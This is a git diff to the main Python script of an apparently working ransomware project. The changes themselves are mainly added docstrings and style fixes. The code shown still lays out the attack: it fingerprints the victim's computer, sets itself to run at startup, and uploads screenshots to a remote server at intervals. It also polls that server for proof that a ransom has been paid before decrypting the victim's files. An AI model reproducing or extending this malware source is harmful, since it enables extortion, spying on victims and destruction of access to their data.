@@ -1,5 +1,8 @@
 #  Copyright (c) 2022. Esteban Restoy e.restoy24@gmail.com
 
+"""System modules"""
+import sys
+
 import requests
 from dotenv import load_dotenv
 
@@ -14,26 +17,33 @@ import asyncio
 import datetime
 from threading import Thread
 
+"""project modules"""
 from modules.cryptography.file_decryption import decrypt_file
 from modules.cryptography.file_encryption import encrypt_file
 from modules.internet.get_ressources import get_has_paid, get_the_decryption_key
 from modules.internet.post_ressources import create_computer, post_image
 from modules.miscellaneous.computer_properties import get_computer_name, \
     get_computer_os, get_public_ip, get_private_ip, take_screenshot, startup_exec
-from modules.miscellaneous.config_file import get_config_file_info, create_config_file, edit_config_file
+from modules.miscellaneous.config_file import get_config_file_info, \
+    create_config_file, edit_config_file
 from modules.internet.patch_ressources import patch_last_message_date
 
 TRUE_ALIASES = [True, "True", "true", "yes"]
 
-global is_connected
-
 
 def get_all_files_in_directory(path):
+    """
+    This function return all files and sub_files in a directory passed in param
+    1) Use Glob to get all the file and return them in array shape
+    :param path: the start path
+    """
     return [f for f in glob.glob(path + '/**/*', recursive=True) if isfile(f)]
 
 
 async def main():
-    global is_connected
+    """
+    This function is the main function
+    """
     is_connected = False
     key = ""
     # -- STARTUP MODULE --
@@ -81,6 +91,14 @@ async def main():
 # -- HAS PAID MODULE --
 
 def has_paid_checker_module(computer_id: str):
+    """
+    This function check if the user has paid on the web server
+    1) Loop undefinitively and ask the web server if the client has paid
+    2) Wait X seconds (X => value in env file)
+    3) Re check again
+    4) ...
+    :param computer_id: The ID of the computer
+    """
     while True:
         try:
             print("-- HE HAS PAID : --" + str(get_has_paid(computer_id)))
@@ -90,11 +108,12 @@ def has_paid_checker_module(computer_id: str):
                 if key:
                     loop = asyncio.new_event_loop()
                     asyncio.set_event_loop(loop)
-
-                    loop.run_until_complete(asyncio.gather(*[decrypt_file(file, Fernet(key)) for file in files]))
+                    loop.run_until_complete(
+                        asyncio.gather(*[decrypt_file(file, Fernet(key)) for file in files])
+                    )
                     loop.close()
                     edit_config_file("has_paid", "True")
-                exit(0)
+                sys.exit(0)
         except requests.ConnectionError:
             print("Wait for web server to respond . . .")
             time.sleep(10)
@@ -107,6 +126,14 @@ def has_paid_checker_module(computer_id: str):
 # -- SCREENSHOT MODULE --
 
 def screenshot_module(computer_id):
+    """
+    This function make screenshot and send them to the web server all the X time
+    1) Loop undefinitivly and send to the web server screenshot
+    2) Wait X seconds (X => value in env file)
+    3) Re send another screenshot again
+    4) ...
+    :param computer_id: The ID of the computer
+    """
     while True:
         try:
             if os.getenv("ENABLE_SCREENSHOT") in TRUE_ALIASES:
@@ -125,5 +152,5 @@ def screenshot_module(computer_id):
 if __name__ == '__main__':
 
     if get_config_file_info("has_paid") in TRUE_ALIASES:
-        quit(0)
+        sys.exit(0)
     asyncio.run(main())
